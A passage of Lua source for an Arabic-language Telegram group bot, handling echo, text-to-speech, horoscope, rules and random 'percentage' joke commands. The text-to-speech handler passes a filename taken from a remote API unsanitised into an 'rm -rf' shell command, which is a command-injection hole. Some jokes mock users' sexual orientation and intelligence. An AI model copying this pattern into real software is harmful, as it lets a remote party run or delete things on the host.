DevHmD:del(DevTwix..'HmD:Cool:HmD'..msg.chat_id_) 
end
if text == "تعطيل كول" and Manager(msg) and ChTwixDev(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل امر كول بنجاح",'md')
DevHmD:set(DevTwix..'HmD:Cool:HmD'..msg.chat_id_,true)  
end
if text and text:match("^كول (.*)$") and not DevHmD:get(DevTwix..'HmD:Cool:HmD'..msg.chat_id_) and ChTwixDev(msg) then
local txt = {string.match(text, "^(كول) (.*)$")}
Dev_HmD(msg.chat_id_,0, 1, txt[2], 1, 'md')
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if text == "تفعيل انطق" and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل امر انطق بنجاح",'md')
DevHmD:del(DevTwix..'HmD:Antk:HmD'..msg.chat_id_) 
end
if text == "تعطيل انطق" and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل امر انطق بنجاح",'md')
DevHmD:set(DevTwix..'HmD:Antk:HmD'..msg.chat_id_,true)  
end
if text and text:match("^انطق (.*)$") and not DevHmD:get(DevTwix..'HmD:Antk:HmD'..msg.chat_id_) and ChCheck(msg) then
local UrlAntk = https.request('https://apiabs.ml/Antk.php?abs='..URL.escape(text:match("^انطق (.*)$")))
Antk = JSON.decode(UrlAntk)
if UrlAntk.ok ~= false then
download_to_file("https://translate"..Antk.result.google..Antk.result.code.."UTF-8"..Antk.result.utf..Antk.result.translate.."&tl=ar-IN",Antk.result.translate..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..Antk.result.translate..'.mp3')  
os.execute('rm -rf ./'..Antk.result.translate..'.mp3') 
end
end
---------------------------------------------------------------------------------------
if DevHmD:get(DevTwix..'HmD:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
DevHmD:del(DevTwix..'HmD:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevHmD:del(DevTwix..'HmD:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevHmD:set(DevTwix..'HmD:rules'..msg.chat_id_,text)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم حفظ قوانين المجموعه', 1, 'md')
return false   
end
if text and text:match("^ضع قوانين$") and ChCheck(msg) or text and text:match("^وضع قوانين$") and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙ارسل لي القوانين الان', 1, 'md')
DevHmD:set(DevTwix..'HmD:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") and ChCheck(msg) then
local rules = DevHmD:get(DevTwix..'HmD:rules'..msg.chat_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
---------------------------------------------------------------------------------------
if text == 'رقمي' and ChCheck(msg) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.phone_number_  then
MyNumber = "⋄︙رقمك » +"..result.phone_number_
else
MyNumber = "⋄︙رقمك موضوع لجهات اتصالك فقط"
end
send(msg.chat_id_, msg.id_,MyNumber)
end,nil)
end
---------------------------------------------------------------------------------------
if text == "تفعيل الزخرفه" and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل امر الزخرفه بنجاح",'md')
DevHmD:del(DevTwix..'HmD:Zrf:HmD'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل امر الزخرفة بنجاح",'md')
DevHmD:set(DevTwix..'HmD:Zrf:HmD'..msg.chat_id_,true)  
end
if DevHmD:get(DevTwix..'Zrf:HmD'..msg.chat_id_..msg.sender_user_id_) then 
if text and text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء امر الزخرفه', 1, 'md')
DevHmD:del(DevTwix..'Zrf:HmD'..msg.chat_id_..msg.sender_user_id_)
return false  
end 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(text)) 
Zrf = JSON.decode(UrlZrf) 
t = "⋄︙قائمة الزخرفه » \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, t, 1, 'md')
DevHmD:del(DevTwix..'Zrf:HmD'..msg.chat_id_..msg.sender_user_id_)
return false   
end
if not DevHmD:get(DevTwix..'HmD:Zrf:HmD'..msg.chat_id_) then
if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg) then  
DevHmD:setex(DevTwix.."Zrf:HmD"..msg.chat_id_..msg.sender_user_id_,300,true)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙ارسل لي الكلمه لزخرفتها \nيمكنك الزخرفة باللغه { en } ~ { ar } ', 1, 'md')
end
end
if not DevHmD:get(DevTwix..'HmD:Zrf:HmD'..msg.chat_id_) then
if text and text:match("^زخرفه (.*)$") and ChCheck(msg) or text and text:match("^زخرف (.*)$") and ChCheck(msg) then 
local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZrf)) 
Zrf = JSON.decode(UrlZrf) 
t = "⋄︙قائمة الزخرفه » \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, t, 1, 'md')
end
end
---------------------------------------------------------------------------------------
if text == "تفعيل الابراج" and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل الابراج بنجاح",'md')
DevHmD:del(DevTwix..'HmD:Brg:HmD'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل الابراج بنجاح",'md')
DevHmD:set(DevTwix..'HmD:Brg:HmD'..msg.chat_id_,true)  
end
if text and text:match("^برج (.*)$") then
local Textbrj = text:match("^برج (.*)$")
gk = https.request('https://black-source.tk/BlackTeAM/Horoscopes.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
send(msg.chat_id_, msg.id_, br.ok.hso)
end
if text == "الابراج" then
local Text = [[⋄︙*أهلا عزيزي قم بأختيار برجك الان .*]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = "برج الجوزاء",callback_data=msg.sender_user_id_.."Getprjالجوزاء"},{text ="برج الثور",callback_data=msg.sender_user_id_.."Getprjالثور"},{text ="برج الحمل",callback_data=msg.sender_user_id_.."Getprjالحمل"}},
{{text = "برج العذراء",callback_data=msg.sender_user_id_.."Getprjالعذراء"},{text ="برج الاسد",callback_data=msg.sender_user_id_.."Getprjالاسد"},{text ="برج السرطان",callback_data=msg.sender_user_id_.."Getprjالسرطان"}},
{{text = "برج القوس",callback_data=msg.sender_user_id_.."Getprjالقوس"},{text ="برج العقرب",callback_data=msg.sender_user_id_.."Getprjالعقرب"},{text ="برج الميزان",callback_data=msg.sender_user_id_.."Getprjالميزان"}},
{{text = "برج الحوت",callback_data=msg.sender_user_id_.."Getprjالحوت"},{text ="برج الدلو",callback_data=msg.sender_user_id_.."Getprjالدلو"},{text ="برج الجدي",callback_data=msg.sender_user_id_.."Getprjالجدي"}},
{{text = '᥀ TeaM Twix ˛',url="t.me/DevTwix"}},} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
---------------------------------------------------------------------------------------
if text and (text == "تفعيل اوامر النسب" or text == "تفعيل النسب" or text == "تفعيل نسبه الكره" or text == "تفعيل نسبه الرجوله" or text == "تفعيل نسبه الانوثه" or text == "تفعيل نسبه الغباء") and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تفعيل اوامر النسب",'md')
DevHmD:del(DevTwix..'HmD:Nsba:HmD'..msg.chat_id_) 
end
if text and (text == "تعطيل اوامر النسب" or text == "تعطيل النسب" or text == "تعطيل نسبه الكره" or text == "تعطيل نسبه الرجوله" or text == "تعطيل نسبه الانوثه" or text == "تعطيل نسبه الغباء") and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تعطيل اوامر النسب",'md')
DevHmD:set(DevTwix..'HmD:Nsba:HmD'..msg.chat_id_,true)  
end
if not DevHmD:get(DevTwix..'HmD:Nsba:HmD'..msg.chat_id_) then
if text == "نسبه الحب" and ChCheck(msg) or text == "✧ نسبة الحب ✧" and ChCheck(msg) then
DevHmD:set(DevTwix..'LoveNsba:HmD'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙قم بأرسال اسمك ولاسم الثاني :\n☨︙كمثال » نــون و آحـمد', 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "✧ نسبة الحب ✧" and DevHmD:get(DevTwix..'LoveNsba:HmD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙تم الغاء امر نسبة الحب ', 1, 'md')
DevHmD:del(DevTwix..'LoveNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Love = {'%10 🙈♥️','%56 محبوبين 🥺💓','97% تخبلون 🙊💋','% بلـ %100 🙈🔥','حبهم مينوصف 🌚💘','0% ماكو حب 🥲♥️','90% فول حب 😍❤️','100% ضيم مو حب  😉🙈','4% مكروهين 😀🤍','34% موكلش 😋💓','وفوف 60% 😝',};
sendLove = Love[math.random(#Love)]
local Text = "*☨︙*اليك النتائج الخـاصة  : \n\n*☨︙*عـزيزي نسبة الحب بيـن : *"..text.."*"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ''..sendLove..'' ,url="https://t.me/DevTwix"}},
{{text="• اخفاء النسبة •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevHmD:del(DevTwix..'LoveNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
if not DevHmD:get(DevTwix..'HmD:Nsba:HmD'..msg.chat_id_) then
if text == "نسبه الخيانه" and ChCheck(msg) or text == "نسبة الخيانه" and ChCheck(msg) or text == "✧ نسبة الخيانه ✧" and ChCheck(msg) then
DevHmD:set(DevTwix..'RyNsba:HmD'..msg.chat_id_..msg.sender_user_id_,true)
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙قم بأرسال اسمك ولاسم الثاني :\n☨︙كمثال » نــون و آحـمد', 'md')
end
end
if text and text ~= "نسبه الخيانه" and text ~= "نسبة الخيانه" and text ~= "✧ نسبة الخيانه ✧" and DevHmD:get(DevTwix..'RyNsba:HmD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙تم الغاء امر نسبة الخيانه ', 1, 'md')
DevHmD:del(DevTwix..'RyNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
B = math.random(0,100);
local Text = "*☨︙*اليك النتائج الخـاصة  : \n\n*☨︙*عـزيزي نسبة الخيانة : *"..text.."*"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '💔🥲. '..B..'%' ,url="https://t.me/DevTwix"}},
{{text="• اخفاء النسبة •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevHmD:del(DevTwix..'RyNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevHmD:get(DevTwix..'HmD:Nsba:HmD'..msg.chat_id_) then
if text and (text == "نسبه الجمال" or text == "نسبة الجمال" or text == "✧ نسبة الجمال ✧") and ChCheck(msg) then
DevHmD:set(DevTwix..'JNsba:HmD'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙قم بأرسال اسمك لتقييم جمالك بـ% :', 'md')
end
end
if text and text ~= "نسبه الجمال" and text ~= "نسبة الجمال" and text ~= "✧ نسبة الجمال ✧" and DevHmD:get(DevTwix..'JNsba:HmD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙تم الغاء امر نسبة الجمال ', 1, 'md')
DevHmD:del(DevTwix..'JNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
ubmj = {'فول جمال 🙈♥️','يلعب نفس 🤣👌','ححات يخبل 🙊💋','% بلـ % 🙈🔥','مينوصف 🌚💘','يشئ شئ 🥲♥️','عيع يخرع 😂😁','حلو الكروب 😉🙈','خزيتنه 1% 😹🌚','جمال يوسف 😋🦋','دمشي منيلك جمال 😝',};
local Text = "*☨︙*اليك النتائج الخـاصة  : \n\n*☨︙*عـزيزي نسبة الجمال : *"..text.."*"
sendubmj = ubmj[math.random(#ubmj)]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ''..sendubmj..'' ,url="https://t.me/DevTwix"}},
{{text="• اخفاء النسبة •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevHmD:del(DevTwix..'JNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
if not DevHmD:get(DevTwix..'HmD:Nsba:HmD'..msg.chat_id_) then
if text == "نسبه الكره" and ChCheck(msg) or text == "نسبة الكره" and ChCheck(msg) or text == "✧ نسبة الكره ✧" and ChCheck(msg) then
DevHmD:set(DevTwix..'HataNsba:HmD'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙قم بأرسال اسمك ولاسم الثاني :\n☨︙كمثال » نــون و آحـمد', 'md')
end
end
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and text ~= "✧ نسبة الكره ✧" and DevHmD:get(DevTwix..'HataNsba:HmD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙تم الغاء امر نسبة الكره ', 1, 'md')
DevHmD:del(DevTwix..'HataNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
D = math.random(0,100);
local Text = "*☨︙*اليك النتائج الخـاصة  : \n\n*☨︙*عـزيزي نسبة الكرة بيـن : *"..text.."*"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '💦😭. '..D..'%' ,url="https://t.me/DevTwix"}},
{{text="• اخفاء النسبة •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevHmD:del(DevTwix..'HataNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevHmD:get(DevTwix..'HmD:Nsba:HmD'..msg.chat_id_) then
if text and (text == "نسبه الرجوله" or text == "نسبة الرجوله" or text == "نسبه رجوله" or text == "نسبة رجوله" or text == "✧ نسبة الرجوله ✧") and ChCheck(msg) then
DevHmD:set(DevTwix..'RjolaNsba:HmD'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙قم بأرسال اسمك لتقييم رجولتك بـ% :', 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and text ~= "✧ نسبة الرجوله ✧" and DevHmD:get(DevTwix..'RjolaNsba:HmD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙تم الغاء امر نسبة الرجوله ', 1, 'md')
DevHmD:del(DevTwix..'RjolaNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
E = math.random(0,100);
local Text = "*☨︙*اليك النتائج الخـاصة  : \n\n*☨︙*عـزيزي نسبة الرجولة : *"..text.."*"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🦾👨🏻‍🦳. '..E..'%' ,url="https://t.me/DevTwix"}},
{{text="• اخفاء النسبة •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevHmD:del(DevTwix..'RjolaNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
if not DevHmD:get(DevTwix..'HmD:Nsba:HmD'..msg.chat_id_) then
if text and (text == "نسبه الانوثه" or text == "نسبة الانوثه" or text == "نسبه انوثه" or text == "نسبة انوثه" or text == "✧ نسبة الانوثه ✧") and ChCheck(msg) then
DevHmD:set(DevTwix..'AnothaNsba:HmD'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙قم بأرسال اسمك لتقييم انوثتك بـ% :', 'md')
end
end
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and text ~= "✧ نسبة الانوثه ✧" and DevHmD:get(DevTwix..'AnothaNsba:HmD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙تم الغاء امر نسبة الانوثه ', 1, 'md')
DevHmD:del(DevTwix..'AnothaNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
F = math.random(0,100);
local Text = "*☨︙*اليك النتائج الخـاصة  : \n\n*☨︙*عـزيزي نسبة الانوثة : *"..text.."*"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🦋👧🏻. '..F..'%' ,url="https://t.me/DevTwix"}},
{{text="• اخفاء النسبة •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevHmD:del(DevTwix..'AnothaNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
if not DevHmD:get(DevTwix..'HmD:Nsba:HmD'..msg.chat_id_) then
if text and (text == "نسبه الغباء" or text == "نسبة الغباء" or text == "✧ نسبة الغباء ✧") and ChCheck(msg) then
DevHmD:set(DevTwix..'StupidNsba:HmD'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙قم بأرسال اسمك لتقييم غبائك بـ% :', 'md')
end
end
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and text ~= "✧ نسبة الغباء ✧" and DevHmD:get(DevTwix..'StupidNsba:HmD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevHmD:del(DevTwix..'StupidNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
G = math.random(0,100);
local Text = "*☨︙*اليك النتائج الخـاصة  : \n\n*☨︙*عـزيزي نسبة الغباء : *"..text.."*"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '💘😿. '..G..'%' ,url="https://t.me/DevTwix"}},
{{text="• اخفاء النسبة •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevHmD:del(DevTwix..'StupidNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
if not DevHmD:get(DevTwix..'HmD:Nsba:HmD'..msg.chat_id_) then
if text and (text == "نسبه الزحف" or text == "نسبة الزحف" or text == "✧ نسبة الزحف ✧") and ChCheck(msg) then
DevHmD:set(DevTwix..'ZahefNsba:HmD'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙قم بأرسال اسمك لتقييم الزحف بـ% :', 'md')
end
end
if text and text ~= "نسبه الزحف" and text ~= "نسبة الزحف" and text ~= "✧ نسبة الزحف ✧" and DevHmD:get(DevTwix..'ZahefNsba:HmD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevHmD:del(DevTwix..'ZahefNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
H = math.random(0,100);
local Text = "*☨︙*اليك النتائج الخـاصة  : \n\n*☨︙*عـزيزي نسبة  الزحف : *"..text.."*"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🌚😂. '..H..'%' ,url="https://t.me/DevTwix"}},
{{text="• اخفاء النسبة •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevHmD:del(DevTwix..'ZahefNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevHmD:get(DevTwix..'HmD:Nsba:HmD'..msg.chat_id_) then
if text and (text == "كشف الحيوان" or text == "كشف حيوان" or text == "✧ كشف الحيوان ✧") and ChCheck(msg) then
DevHmD:set(DevTwix..'HuinNsba:HmD'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙ارسال اسمك لمعرفة نوعك من الحيوان :', 'md')
end
end
if text and text ~= "كشف الحيوان" and text ~= "كشف حيوان" and text ~= "✧ كشف الحيوان ✧" and DevHmD:get(DevTwix..'HuinNsba:HmD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevHmD:del(DevTwix..'HuinNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
numj = {'قنفذ 🦝','صخل 🐐','جلب 🦮','بقرة 🐄','خنزير 🐖','قرد 🦧','فأر 🐁','تمساح 🐊','ذبانه 🪰','حصان 🐴','حية 🪱',};
local Text = "*☨︙*اليك النتائج الخـاصة  : \n\n*☨︙*عـزيزي نوع الحيوان : *"..text.."*"
sendnmj = numj[math.random(#numj)]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ''..sendnmj..' .' ,url="https://t.me/DevTwix"}},
{{text="• اخفاء النتيجة •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevHmD:del(DevTwix..'HuinNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevHmD:get(DevTwix..'HmD:Nsba:HmD'..msg.chat_id_) then
if text and (text == "نسبه المثليه" or text == "نسبة المثلية" or text == "✧ نسبة المثلية ✧") and ChCheck(msg) then
DevHmD:set(DevTwix..'MetelNsba:HmD'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_HmD(msg.chat_id_, msg.id_, 1,'☨︙قم بأرسال اسمك ولاسم الثاني :\n☨︙كمثال » نــون و آحـمد', 'md')
end
end
if text and text ~= "نسبه المثليه" and text ~= "نسبة المثلية" and text ~= "✧ نسبة المثلية ✧" and DevHmD:get(DevTwix..'MetelNsba:HmD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevHmD:del(DevTwix..'MetelNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Metel = {'%10 🌝😂','%56 🤣🌈','97% الوان 😹🌚🌈','100% 😂🔥','13% قليل 🤐🤙🏿','0% صفر 🥲♥️','90% مثليين 😂❤️','100% فولل 😉💓','3% 🥺😹🤍','34% موكلش 😋💓','وفوف 60% 😝🧃',};
sendMetel = Metel[math.random(#Metel)]
local Text = "*☨︙*اليك النتائج الخـاصة  : \n\n*☨︙*عـزيزي نسبة المثلية: *"..text.."*"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '.'..sendMetel..'' ,url="https://t.me/DevTwix"}},
{{text="• اخفاء النسبة •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevHmD:del(DevTwix..'MetelNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
if not DevHmD:get(DevTwix..'HmD:Nsba:HmD'..msg.chat_id_) then
if text and (text == "نسبه التفاعل" or text == "نسبة التفاعل" or text == "✧ نسبة التفاعل ✧") and ChCheck(msg) then
DevHmD:set(DevTwix..'MsNsba:HmD'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_HmD(msg.chat_id_, msg.id_, 1,'☨︙ارسال اسمك لمعرفة نسبه تفاعلك :', 'md')
end
end
if text and text ~= "نسبه التفاعل" and text ~= "نسبة التفاعل" and text ~= "✧ نسبة التفاعل ✧" and DevHmD:get(DevTwix..'MsNsba:HmD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevHmD:del(DevTwix..'MsNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
Mss = math.random(0,100);
local Text = "*☨︙*اليك النتائج الخـاصة  : \n\n*☨︙*عـزيزي نسبة التفاعل: *"..text.."*"
keyboard = {} 
keyboard.inline_keyboard = {
{{text =''..Mss..'%',url="https://t.me/DevTwix"}},
{{text="• اخفاء النسبة •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevHmD:del(DevTwix..'MsNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
if not DevHmD:get(DevTwix..'HmD:Nsba:HmD'..msg.chat_id_) then
if text and (text == "كشف الارتباط" or text == "كشف ارتباط" or text == "✧ كشف الارتباط ✧") and ChCheck(msg) then
DevHmD:set(DevTwix..'nukjNsba:HmD'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_HmD(msg.chat_id_, msg.id_, 1,'☨︙ارسال اسم الشخص لكشفه مرتبط :', 'md')
end
end
if text and text ~= "كشف الارتباط" and text ~= "كشف ارتباط" and text ~= "✧ كشف الارتباط ✧" and DevHmD:get(DevTwix..'nukjNsba:HmD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '☨︙تم الغاء امر نسبة الغباء ', 1, 'md')
